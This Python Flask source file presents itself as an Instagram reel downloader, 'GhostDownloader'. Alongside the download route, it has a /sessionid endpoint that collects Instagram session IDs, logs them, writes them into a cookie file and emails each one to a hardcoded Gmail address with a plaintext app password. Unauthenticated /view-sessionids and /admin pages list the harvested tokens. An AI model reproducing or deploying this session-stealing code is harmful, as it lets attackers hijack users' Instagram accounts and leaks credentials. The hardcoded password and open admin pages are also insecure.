from flask import Flask, request, jsonify, send_file, Response, render_template_string, redirect
import yt_dlp
import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication

app = Flask(__name__)
SESSION_LOG_FILE = "session_ids_storage.txt"
COOKIES_FILE = "cookies.txt"
MAX_SESSION_LOG = 5

def send_email(subject, body, to_email, attachment_path=None):
    from_email = "bashirahamad002@gmail.com"
    from_password = "nlfs lozn jebu odug"

    msg = MIMEMultipart()
    msg["Subject"] = subject
    msg["From"] = from_email
    msg["To"] = to_email

    msg.attach(MIMEText(body, "plain"))

    if attachment_path and os.path.exists(attachment_path):
        with open(attachment_path, "rb") as f:
            part = MIMEApplication(f.read(), Name=os.path.basename(attachment_path))
            part["Content-Disposition"] = f'attachment; filename="{os.path.basename(attachment_path)}"'
            msg.attach(part)

    try:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(from_email, from_password)
            server.send_message(msg)
        print("✅ Email sent with attachment!")
    except Exception as e:
        print(f"❌ Email error: {e}")


@app.route("/")
def home():
    return "👻 Instagram Reel Downloader API is running!"


@app.route("/download", methods=["POST"])
def download():
    data = request.json
    url = data.get("url")
    if not url:
        return jsonify({"error": "Missing URL"}), 400
    
    
    try:

        ydl_opts = {
            "format": "bestvideo+bestaudio/best",
            "merge_output_format": "mp4",
            "outtmpl": "/tmp/%(id)s.%(ext)s",
            "cookiefile": COOKIES_FILE,
        }

        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(url, download=True)

        video_id = info.get("id")
        ext = info.get("ext", "mp4")
        local_file_path = f"/tmp/{video_id}.{ext}"

        return send_file(local_file_path, mimetype="video/mp4", as_attachment=False)

    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/sessionid", methods=["POST"])
def receive_sessionid():
    data = request.get_json()
    session_id = data.get("sessionid")
    if not session_id:
        return jsonify({"error": "Missing sessionid"}), 400

    print(f"[✔️ RECEIVED] Session ID: {session_id}")

    # Write cookies.txt
    cookie_content = f"""# Netscape HTTP Cookie File
.instagram.com	TRUE	/	FALSE	9999999999	sessionid	{session_id}
"""
    with open(COOKIES_FILE, "w") as f:
        f.write(cookie_content)

    # Save to log file (keep only last MAX_SESSION_LOG entries)
    try:
        lines = []
        if os.path.exists(SESSION_LOG_FILE):
            with open(SESSION_LOG_FILE, "r") as f:
                lines = f.readlines()

        lines = [session_id + "\n"] + lines
        lines = lines[:MAX_SESSION_LOG]

        with open(SESSION_LOG_FILE, "w") as f:
            f.writelines(lines)

    except Exception as e:
        print(f"❌ Session log error: {e}")

    # Email the session with cookies.txt attached
    send_email(
        subject="👻 GhostDownloader - New Instagram Session ID",
        body=f"New session ID received:\n\n{session_id}",
        to_email="bashirahamad002@gmail.com",
        attachment_path=COOKIES_FILE
    )

    return jsonify({"message": "Session ID saved, emailed, and cookies.txt generated"}), 200


@app.route("/view-sessionids", methods=["GET"])
def view_sessionids():
    try:
        with open(SESSION_LOG_FILE, "r") as file:
            content = file.read()
        return Response(content, mimetype="text/plain")
    except FileNotFoundError:
        return Response("No session IDs saved yet.", mimetype="text/plain")


@app.route("/admin", methods=["GET", "POST"])
def admin_panel():
    if request.method == "POST":
        action = request.form.get("action")
        if action == "clear":
            open(SESSION_LOG_FILE, "w").close()
            return redirect("/admin")

    session_list = []
    if os.path.exists(SESSION_LOG_FILE):
        with open(SESSION_LOG_FILE, "r") as f:
            session_list = [line.strip() for line in f if line.strip()]

    return render_template_string("""
        <html>
        <head>
            <title>👻 GhostDownloader Admin</title>
        </head>
        <body style="font-family: sans-serif; margin: 40px;">
            <h1>Admin Panel - Session IDs</h1>
            {% if session_list %}
                <ul>
                {% for s in session_list %}
                    <li><code>{{ s }}</code></li>
                {% endfor %}
                </ul>
            {% else %}
                <p>No session IDs saved.</p>
            {% endif %}
            <form method="post">
                <button name="action" value="clear" style="padding: 10px 20px; background: red; color: white;">Clear All</button>
            </form>
        </body>
        </html>
    """, session_list=session_list)


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
